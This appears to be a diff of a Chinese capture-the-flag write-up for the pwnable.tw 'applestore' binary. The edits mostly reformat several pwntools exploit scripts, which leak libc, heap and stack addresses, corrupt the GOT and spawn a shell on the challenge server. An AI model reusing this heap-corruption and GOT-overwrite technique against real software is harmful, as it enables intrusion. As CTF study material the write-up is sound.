@@ -42,6 +42,7 @@ applestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamicall
 5: Checkout
 6: Exit
 ```
+
 但尝试发现，挑好东西去收银台人家总不让我结账，总让我下次再结账：
 
 ```bash
@@ -427,13 +428,13 @@ io = process(myelf.path)
 
 add = '2';delete='3';cart='4';checkout='5'
 def action(num,payload):
-        io.sendlineafter('> ',num)
-        io.sendlineafter('> ',payload)
+    io.sendlineafter('> ',num)
+    io.sendlineafter('> ',payload)
 
 for i in range(6):
-        action(add,'1')
+    action(add,'1')
 for i in range(20):
-        action(add,'2')
+    action(add,'2')
 action(checkout,'y')
 
 io.recv()
@@ -668,12 +669,12 @@ io = process(myelf.path)
 add = '2';delete='3';cart='4';checkout='5'
 
 def action(num,payload):
-        io.sendlineafter('> ',num)
-        io.sendlineafter('> ',payload)
+    io.sendlineafter('> ',num)
+    io.sendlineafter('> ',payload)
 for i in range(6):
-        action(add,'1')
+    action(add,'1')
 for i in range(20):
-        action(add,'2')
+    action(add,'2')
 action(checkout,'y')
 
 payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
@@ -687,7 +688,7 @@ heap_addr = u32(io.recv(4))
 log.warn('libc_addr: 0x%x' % libc_addr)
 log.warn('heap_addr: 0x%x' % heap_addr)
 
-gdb.attach(io,"b * 0x8048beb")
+gdb.attach(io,'b * 0x8048beb')
 io.interactive()
 ```
 
@@ -760,12 +761,12 @@ io = process(myelf.path)
 add = '2';delete='3';cart='4';checkout='5'
 
 def action(num,payload):
-        io.sendlineafter('> ',num)
-        io.sendlineafter('> ',payload)
+    io.sendlineafter('> ',num)
+    io.sendlineafter('> ',payload)
 for i in range(6):
-        action(add,'1')
+    action(add,'1')
 for i in range(20):
-        action(add,'2')
+    action(add,'2')
 action(checkout,'y')
 
 payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
@@ -785,7 +786,7 @@ log.warn('libc_addr: %x' % libc_addr)
 log.warn('heap_addr: %x' % heap_addr)
 log.warn('stack_addr: %x' % stack_addr)
 
-gdb.attach(io,"b * 0x8048beb")
+gdb.attach(io,'b * 0x8048beb')
 io.interactive()
 ```
 
@@ -859,18 +860,16 @@ context(arch='i386',os='linux',log_level='debug')
 myelf = ELF('applestore')
 libc = ELF('../../my_ubuntu32_libc.so')
 io = process(myelf.path)
-# libc = ELF("./libc_32.so.6")
-# io = remote("chall.pwnable.tw",10104)
 
 add = '2';delete='3';cart='4';checkout='5'
 
 def action(num,payload):
-        io.sendlineafter('> ',num)
-        io.sendlineafter('> ',payload)
+    io.sendlineafter('> ',num)
+    io.sendlineafter('> ',payload)
 for i in range(6):
-        action(add,'1')
+    action(add,'1')
 for i in range(20):
-        action(add,'2')
+    action(add,'2')
 action(checkout,'y')
 
 payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
@@ -939,18 +938,16 @@ context(arch='i386',os='linux',log_level='debug')
 myelf = ELF('applestore')
 libc = ELF('../../my_ubuntu32_libc.so')
 io = process(myelf.path)
-# libc = ELF("./libc_32.so.6")
-# io = remote("chall.pwnable.tw",10104)
 
 add = '2';delete='3';cart='4';checkout='5'
 
 def action(num,payload):
-        io.sendlineafter('> ',num)
-        io.sendlineafter('> ',payload)
+    io.sendlineafter('> ',num)
+    io.sendlineafter('> ',payload)
 for i in range(6):
-        action(add,'1')
+    action(add,'1')
 for i in range(20):
-        action(add,'2')
+    action(add,'2')
 action(checkout,'y')
 
 payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
@@ -968,7 +965,7 @@ stack_addr = u32(io.recv(4))
 ebp = stack_addr + 0x20
 
 for i in range(25):
-        action(delete,'1')
+    action(delete,'1')
 
 gdb.attach(io,"b * 0x08048C46\nc\np $ebp")
 
@@ -1112,12 +1109,12 @@ io = remote("chall.pwnable.tw",10104)
 add = '2';delete='3';cart='4';checkout='5'
 
 def action(num,payload):
-        io.sendlineafter('> ',num)
-        io.sendlineafter('> ',payload)
+    io.sendlineafter('> ',num)
+    io.sendlineafter('> ',payload)
 for i in range(6):
-        action(add,'1')
+    action(add,'1')
 for i in range(20):
-        action(add,'2')
+    action(add,'2')
 
 action(checkout,'y')
 payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
@@ -1131,14 +1128,13 @@ action(cart,payload)
 io.recvuntil('27: ')
 ebp = u32(io.recv(4))+0x20
 for i in range(25):
-        action(delete,'1')
+    action(delete,'1')
 #payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(ebp-0xc)+p32(myelf.got['asprintf']+0x22)
 payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(myelf.got['asprintf']+0x22)+p32(ebp-0x8)
 action(delete,payload)
 payload = 'sh\x00\x00'+p32(libc_addr+libc.symbols['system'])
 io.sendlineafter("> ",payload)
 
-# gdb.attach(io,"b * 0x8048beb")
 io.interactive()
 ```
 
